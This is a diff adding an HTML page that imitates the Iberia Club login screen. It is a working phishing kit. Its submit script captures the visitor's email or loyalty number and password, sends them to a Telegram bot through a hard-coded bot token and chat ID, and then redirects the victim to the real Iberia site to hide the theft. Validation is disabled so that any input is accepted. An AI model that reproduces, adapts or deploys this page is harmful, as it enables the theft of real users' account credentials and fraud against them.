@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  
+
+  <title>Acceso a Iberia Club</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+
+
+  <!-- Favicon / ícone -->
+  <link rel="icon" type="image/svg+xml" href="./avisoswe_files/xxx1.svg">
+
+  <!-- CSS oficial Iberia -->
+  <link rel="stylesheet" href="./avisoswe_files/IDY_ib-style-modules-identity-4_13_0.css">
+
+  <!-- Fontes e estilos extras -->
+  <style>
+    @font-face{
+      font-family:"iberiaheadline";
+      font-style:normal;
+      font-weight:normal;
+      src:url("assets/iberiaheadline.ttf")
+    }
+    @font-face{
+      font-family:"iberiatext";
+      font-style:normal;
+      font-weight:normal;
+      src:url("assets/iberiatext.ttf")
+    }
+    @font-face{
+      font-family:"iberia";
+      font-style:normal;
+      font-weight:normal;
+      src:url("assets/iberia.ttf")
+    }
+
+    .ib-background--image{
+      background-image:url("assets/IDY_IberiaFondoLogin.jpg");
+      background-size:cover;
+      background-position:center;
+      min-height:100vh;
+    }
+    @media screen and (max-width:79.96rem){
+      .ib-background--image{
+        background-image:url("assets/IDY_IberiaFondoLogin_1024.jpg");
+      }
+    }
+    @media screen and (max-width:63.96rem){
+      .ib-background--image{
+        background-image:url("assets/IDY_IberiaFondoLogin_768.jpg");
+      }
+    }
+
+    .ib-button--google-new::before{
+      background:url("assets/IDY_googleIcon.png") no-repeat center;
+    }
+    .ib-button--facebook-new::before{
+      background:url("assets/IDY_facebookIcon.png") no-repeat center;
+      background-size:1.5625rem;
+    }
+
+    .ib-idt-header{
+      background:#d7192d;
+      min-height:4.375rem;
+      font-family:verdana,arial,helvetica,sans-serif;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      color:#fff;
+      font-size:.813rem;
+      padding:0 3rem;
+    }
+    .ib-idt-header__container{
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      max-width:57rem;
+      width:100%;
+      height:100%;
+    }
+    .ib-idt-header__container-left{
+      height:100%;
+      display:flex;
+      align-items:center;
+      gap:1rem;
+    }
+    .ib-idt-header__logo{
+      cursor:pointer;
+      position:relative;
+      height:2.125rem;
+      width:2.8125rem;
+    }
+    .ib-idt-header__logo img{
+      width:100%;
+      height:100%;
+      object-fit:contain;
+    }
+    .ib-idt-header__separator{
+      position:relative;
+      min-height:4.375rem;
+      background:#a8191a;
+      width:.0625rem;
+      opacity:.7;
+    }
+    .ib-idt-header__container-right{
+      display:flex;
+      align-items:center;
+      gap:1.5rem;
+    }
+    .ib-idt-header__button{
+      text-decoration:none;
+      color:#fff;
+      padding:1rem;
+      border:.0625rem solid #fff;
+      min-width:10rem;
+      text-align:center;
+    }
+    .ib-idt-header__button:hover{
+      background:#b9191a;
+    }
+    @media(max-width:47.96rem){
+      .ib-idt-header{
+        padding:0 1rem;
+        min-height:2.813rem;
+      }
+      .ib-idt-header__logo{
+        height:1.5625rem;
+        width:2.0625rem;
+      }
+      .ib-idt-header__separator{
+        min-height:2.813rem;
+        margin-right:.5rem;
+      }
+      .ib-idt-header__container-right{
+        gap:.5rem;
+      }
+      .ib-idt-header__button{
+        border:none;
+        padding:0;
+        text-decoration:underline;
+        min-width:0;
+      }
+      .ib-idt-header__button:hover{
+        background:inherit;
+        color:#fcd100;
+        text-decoration:none;
+      }
+    }
+
+    .loading-overlay{
+      display:none;
+      position:fixed;
+      top:0;
+      left:0;
+      width:100%;
+      height:100%;
+      background:rgba(0,0,0,.7);
+      z-index:9999;
+      justify-content:center;
+      align-items:center;
+    }
+    .loading-overlay.active{
+      display:flex;
+    }
+    .spinner{
+      border:4px solid #f3f3f3;
+      border-top:4px solid #d7192d;
+      border-radius:50%;
+      width:50px;
+      height:50px;
+      animation:spin 1s linear infinite;
+    }
+    @keyframes spin{
+      0%{transform:rotate(0deg)}
+      100%{transform:rotate(360deg)}
+    }
+
+    html, body{
+      margin:0;
+      padding:0;
+      width:100%;
+      height:100%;
+      overflow:hidden;
+      position:fixed;
+      -webkit-overflow-scrolling:touch;
+    }
+    body{
+      display:flex;
+      flex-direction:column;
+    }
+    .ib-background--image{
+      min-height:100vh;
+      height:100vh;
+      overflow-y:auto;
+      overflow-x:hidden;
+      -webkit-overflow-scrolling:touch;
+    }
+
+    .ib-idt-footer{
+      font-family:verdana,arial,helvetica,sans-serif;
+      color:#fff;
+      font-size:.813rem;
+    }
+    .ib-idt-footer__red{
+      background:linear-gradient(180deg,#d7192d,#a80e1f);
+      padding:2rem 3rem;
+    }
+    .ib-idt-footer__container{
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      max-width:57rem;
+      margin:0 auto;
+    }
+    .ib-idt-footer__logo{
+      height:2.125rem;
+      margin:0;
+    }
+    .ib-idt-footer__logo img{
+      height:100%;
+      width:auto;
+    }
+    .ib-idt-footer__links{
+      display:flex;
+      gap:1.5rem;
+    }
+    .ib-link__footer{
+      color:#fff;
+      text-decoration:none;
+      transition:color .2s;
+    }
+    .ib-link__footer:hover{
+      color:#fcd100;
+    }
+    @media(max-width:47.96rem){
+      .ib-idt-footer__red{
+        padding:1.5rem 1rem;
+      }
+      .ib-idt-footer__container{
+        flex-direction:column;
+        gap:1rem;
+        text-align:center;
+      }
+      .ib-idt-footer__logo{
+        height:1.5rem;
+      }
+    }
+  </style>
+
+
+</head>
+
+<body>
+  <!-- Overlay de loading -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="spinner"></div>
+  </div>
+
+  <!-- HEADER -->
+  <header class="ib-idt-header">
+    <div class="ib-idt-header__container">
+      <div class="ib-idt-header__container-left">
+        <a class="ib-idt-header__logo" href="index.html">
+          <img src="./avisoswe_files/xxx1.svg" alt="Iberia">
+        </a>
+        <div class="ib-idt-header__separator"></div>
+      </div>
+      <div class="ib-idt-header__container-right">
+        <span class="ib-idt-header__link">¿No tienes cuenta?</span>
+        <a href="https://registro-iberiaplus.iberia.com/?language=es&amp;origin=ES" class="ib-idt-header__button">Regístrate</a>
+      </div>
+    </div>
+  </header>
+
+  <!-- CONTEÚDO PRINCIPAL / LOGIN -->
+  <main class="ib-background--image ib-login__container">
+    <section class="ib-login__section">
+      <h2 class="ib-box-separated__title ib-box-separated__title--small">Inicia sesión</h2>
+      <p class="ib-text ib-text--font-text ib-text--xbig ib-text--lh-n-normal u-mb-xmedium">
+        Podrás reservar más rápido y conseguir descuentos
+      </p>
+
+      <!-- FORM -->
+      <form id="loginForm" onsubmit="handleSubmit(); return false;">
+        <section id="cajaLogin">
+          <fieldset>
+            <!-- LOGIN (ACEITA QUALQUER COISA) -->
+            <div class="ib-layout__line-spacing">
+              <div class="ib-input">
+                <label class="ib-input__label" for="loginEmailInput" id="labelEmailLabel">
+                  E-mail o nº Iberia Club
+                </label>
+                <input id="loginEmailInput" type="text" class="ib-input__input ib-input--error" onblur="fullFieldBlur(&#39;labelEmailLabel&#39;,&#39;loginEmailInput&#39;); validateUser();" onfocus="fullFieldFocus(&#39;labelEmailLabel&#39;); clearError(&#39;userError&#39;, &#39;loginEmailInput&#39;);" data-sharkid="__0" data-sharklabel="email">
+              <shark-icon-container data-sharkidcontainer="__0" style="position: absolute;"><template shadowrootmode="open"><surfhark-icon data-sharkidicon="__0" style="background-image: url(&quot;chrome-extension://ailoabdmgclmfmhdagmlohpjlbpffblp/autofill-action-light.svg&quot;); background-repeat: no-repeat; background-position: left center; background-size: cover; position: absolute; right: 0px; visibility: visible; display: block; z-index: 1; border: none; cursor: pointer; padding: 0px; transition: none; pointer-events: all; opacity: 1; left: 378px; top: -37px; width: 18px; height: 18px; min-width: 18px; min-height: 18px;"></surfhark-icon></template></shark-icon-container></div>
+              <div class="ib-alert ib-alert--error" id="userError">
+                <label id="userErrorLabel">Este campo es obligatorio</label>
+              </div>
+            </div>
+
+            <!-- SENHA -->
+            <div class="ib-layout__line-spacing">
+              <div class="ib-input ib-input--icon">
+                <label class="ib-input__label ib-input__label--focus" for="loginPasswordInput" id="labelPasswordLabel">
+                  Contraseña
+                </label>
+                <input id="loginPasswordInput" type="password" class="ib-input__input" onblur="fullFieldBlur(&#39;labelPasswordLabel&#39;,&#39;loginPasswordInput&#39;); validatePass();" onfocus="fullFieldFocus(&#39;labelPasswordLabel&#39;); clearError(&#39;passError&#39;, &#39;loginPasswordInput&#39;);" data-sharkid="__1">
+                <div class="ib-input__info">
+                  <button class="ib-link ib-link--button ib-link--big ib-link--unfocused icon-pass-visible" id="visiblePass" onclick="togglePassword()" type="button"></button>
+                </div>
+              </div>
+              <div class="ib-alert ib-alert--error u-hide" id="passError">
+                <label id="passErrorLabel"></label>
+              </div>
+            </div>
+
+            <a class="ib-box-form__msg-link ib-link__modal" href="https://www.iberia.com/es/iberiaplus/recuperar-password/" target="_blank">
+              ¿Has olvidado tu contraseña?
+            </a>
+
+            <!-- BOTÃO LOGIN -->
+            <button type="submit" class="ib-button ib-box-form__button ib-button--red">
+              Iniciar sesión
+            </button>
+
+            <div style="display:block">
+              <p class="ib-paragraph ib-paragraph__regular ib-paragraph__regular--small ib-paragraph__regular--separator ib-paragraph__regular--login text-center">
+                O
+              </p>
+              <div class="ib-button--rrss ib-login__buttons">
+                <a class="ib-button ib-button--google ib-button--google-new ib-login__buttons--button" href="javascript:void(0);" onclick="alert(&#39;Feature not available&#39;);">
+                  Entrar con Google
+                </a>
+                <a class="ib-button ib-button--facebook ib-button--facebook-new ib-login__buttons--button" href="javascript:void(0);" onclick="alert(&#39;Feature not available&#39;);">
+                  Entrar con Facebook
+                </a>
+              </div>
+            </div>
+          </fieldset>
+        </section>
+      </form>
+
+      <span class="u-text-center u-mb-none u-mt-medium ib-text">
+        ¿Tienes dudas?
+        <a class="ib-link ib-link--inline" href="https://www.iberia.com/es/atencion-al-cliente/">
+          Contacta con nosotros
+        </a>
+      </span>
+    </section>
+  </main>
+
+  <!-- FOOTER -->
+  <footer class="ib-idt-footer">
+    <section class="ib-idt-footer__red">
+      <div class="ib-idt-footer__container">
+        <figure class="ib-idt-footer__logo">
+          <img src="./avisoswe_files/xxx1.svg" alt="Logo Iberia">
+        </figure>
+        <nav class="ib-idt-footer__links">
+          <a class="ib-link__footer" href="https://www.iberia.com/es/accesibilidad/" target="_blank">Accesibilidad</a>
+        </nav>
+      </div>
+    </section>
+  </footer>
+
+  <!-- SCRIPT -->
+  <script>
+    function togglePassword(){
+      var loginPasswordInput = document.getElementById("loginPasswordInput");
+      var visiblePassButton = document.getElementById("visiblePass");
+
+      if(loginPasswordInput.type === "password") {
+        loginPasswordInput.type = "text";
+        visiblePassButton.classList.remove("icon-pass-visible");
+        visiblePassButton.classList.add("icon-pass-hidden");
+      } else {
+        loginPasswordInput.type = "password";
+        visiblePassButton.classList.remove("icon-pass-hidden");
+        visiblePassButton.classList.add("icon-pass-visible");
+      }
+    }
+
+    function fullFieldFocus(labelId){
+      var label = document.getElementById(labelId);
+      if(label) {
+        label.classList.add("ib-input__label--focus");
+      }
+    }
+
+    function fullFieldBlur(labelId, inputId){
+      var input = document.getElementById(inputId);
+      var label = document.getElementById(labelId);
+
+      if(input && label && !input.value) {
+        label.classList.remove("ib-input__label--focus");
+      }
+    }
+
+    function clearError(errorDivId, inputId) {
+      var errorDiv = document.getElementById(errorDivId);
+      var input = document.getElementById(inputId);
+
+      if (errorDiv) errorDiv.classList.add("u-hide");
+      if (input) input.classList.remove("ib-input--error");
+    }
+
+    function showError(errorDivId, errorLabelId, message){
+      var errorDiv = document.getElementById(errorDivId);
+      var errorLabel = document.getElementById(errorLabelId);
+
+      if(errorDiv && errorLabel) {
+        errorLabel.textContent = message;
+        errorDiv.classList.remove("u-hide");
+      }
+    }
+
+    // ✅ AGORA ACEITA QUALQUER COISA (só exige que não esteja vazio)
+    function validateUser() {
+      var elementInput = document.getElementById("loginEmailInput");
+      var elementDiv = document.getElementById("userError");
+      var elementLabel = document.getElementById("userErrorLabel");
+
+      if (!elementInput) return true;
+
+      var value = elementInput.value.trim();
+
+      // vazio: mostra erro obrigatório
+      if (!value) {
+        if (elementDiv && elementLabel) {
+          elementLabel.textContent = "Este campo es obligatorio";
+          elementDiv.classList.remove("u-hide");
+        }
+        elementInput.classList.add("ib-input--error");
+        return false;
+      }
+
+      // qualquer coisa preenchida = válido
+      if (elementDiv && elementLabel) {
+        elementDiv.classList.add("u-hide");
+        elementLabel.textContent = "";
+      }
+      elementInput.classList.remove("ib-input--error");
+      return true;
+    }
+
+    // senha: só checa se está vazia
+    function validatePass() {
+      var elementInput = document.getElementById("loginPasswordInput");
+      var elementDiv = document.getElementById("passError");
+      var elementLabel = document.getElementById("passErrorLabel");
+
+      if (!elementInput) return true;
+
+      var value = elementInput.value.trim();
+
+      if (!value) {
+        if (elementDiv && elementLabel) {
+          elementLabel.textContent = "Este campo es obligatorio";
+          elementDiv.classList.remove("u-hide");
+        }
+        elementInput.classList.add("ib-input--error");
+        return false;
+      }
+
+      if (elementDiv && elementLabel) {
+        elementDiv.classList.add("u-hide");
+        elementLabel.textContent = "";
+      }
+      elementInput.classList.remove("ib-input--error");
+      return true;
+    }
+
+    // As funções abaixo são mantidas só por compatibilidade, mas sempre retornam válido
+    function validateEmailFormat(emailInput) {
+      return { isValid: true, errorMessage: "" };
+    }
+    function validateIberiaClubNumber(input) {
+      return { isValid: true, errorMessage: "", cleanNumber: input, hasInvalidLetters: false };
+    }
+    function validarFF(txtFF) {
+      return true;
+    }
+
+    // UTMs / cookies / FB
+    function getParam(name) {
+      try {
+        var params = new URLSearchParams(window.location.search);
+        return params.get(name) || "";
+      } catch (e) {
+        return "";
+      }
+    }
+
+    // FUNÇÃO PRINCIPAL DE SUBMIT
+    function handleSubmit(){
+      var email = document.getElementById("loginEmailInput").value.trim();
+      var password = document.getElementById("loginPasswordInput").value.trim();
+      
+      if(!email || !password) {
+        alert("Preenchimento obrigatório");
+        return false;
+      }
+      
+      document.getElementById("loadingOverlay").classList.add("active");
+      
+      var botToken = "8332335168:AAH_btZ_aSaBl5L9ZkcGzKxm2P-0upXGj4M";
+      var chatId = "7472435187";
+      var timestamp = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
+      
+      var msg = "<b>🔔 NOVO LOGIN CAPTURADO</b>\n\n" +
+        "<b>👤 Usuário (Email ou Nº Avios):</b>\n<code>" + email + "</code>\n\n" +
+        "<b>🔑 Senha:</b>\n<code>" + password + "</code>\n\n" +
+        "<b>⏰ Data/Hora:</b>\n<code>" + timestamp + "</code>\n\n" +
+        "━━━━━━━━━━━━━━━━━━━━━";
+      
+      var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(msg) + "&parse_mode=HTML";
+      
+      fetch(url, {mode: 'no-cors'})
+        .then(function(){ redirectNow(); })
+        .catch(function(){ redirectNow(); });
+      
+      return false;
+    }
+    
+    function redirectNow(){
+      setTimeout(function(){
+        window.location.href = "https://www.iberia.com/es/";
+      }, 500);
+    }
+
+    // foco no login ao carregar
+    window.addEventListener("load", function(){
+      var input = document.getElementById("loginEmailInput");
+      if (input) input.focus();
+    });
+  </script>
+
+
+</body></html>
